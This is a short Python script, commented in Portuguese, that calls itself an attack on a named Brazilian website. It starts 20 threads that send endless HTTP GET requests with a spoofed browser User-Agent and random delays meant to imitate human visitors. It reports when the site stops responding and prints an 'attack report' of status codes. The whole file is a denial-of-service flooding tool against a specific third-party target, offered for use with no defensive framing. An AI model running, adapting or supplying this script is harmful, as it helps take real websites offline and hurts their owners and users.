import threading
import requests
import time
import random

# URL do alvo
target_url = "https://gelniche.com.br"

# Cabeçalhos HTTP para imitar um navegador legítimo
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Accept-Language": "en-US,en;q=0.5"
}

# Variáveis para registro e análise
start_time = time.time()
end_time = None
success_count = 0
error_count = 0
status_codes = {}

# Função que realiza o ataque enviando solicitações HTTP com atraso
def perform_attack():
    global success_count, error_count, status_codes
    while True:
        try:
            response = requests.get(target_url, headers=headers)
            print(f"Enviado: {response.status_code}")
            success_count += 1
            # Registrar o código de status da resposta
            if response.status_code in status_codes:
                status_codes[response.status_code] += 1
            else:
                status_codes[response.status_code] = 1
            # Atraso aleatório entre 1 e 5 segundos para imitar comportamento humano
            time.sleep(random.uniform(1, 5))
        except requests.exceptions.RequestException as e:
            print(f"Erro: {e}")
            error_count += 1
            # Notificar que o site está fora do ar
            notify_site_down()
            # Aguardar um período antes de tentar novamente
            time.sleep(random.uniform(1, 3))

# Função para notificar que o site está fora do ar
def notify_site_down():
    global end_time
    end_time = time.time()
    print("O site está fora do ar!")

# Função para gerar e imprimir um relatório ao final do ataque
def generate_report():
    global start_time, end_time, success_count, error_count, status_codes
    print("\n--- Relatório de Ataque ---")
    print(f"Horário de início: {time.ctime(start_time)}")
    if end_time:
        print(f"Horário de fim: {time.ctime(end_time)}")
    else:
        print("Ataque ainda em andamento.")
    print(f"Número de solicitações bem-sucedidas: {success_count}")
    print(f"Número de erros: {error_count}")
    print("\nCódigos de status:")
    for code, count in status_codes.items():
        print(f"{code}: {count}")

# Número de threads
number_of_threads = 20

# Criar e iniciar threads
threads = []
for i in range(number_of_threads):
    thread = threading.Thread(target=perform_attack)
    threads.append(thread)
    thread.start()

# Esperar que todas as threads terminem
for thread in threads:
    thread.join()

# Gerar relatório ao final do ataque
generate_report()
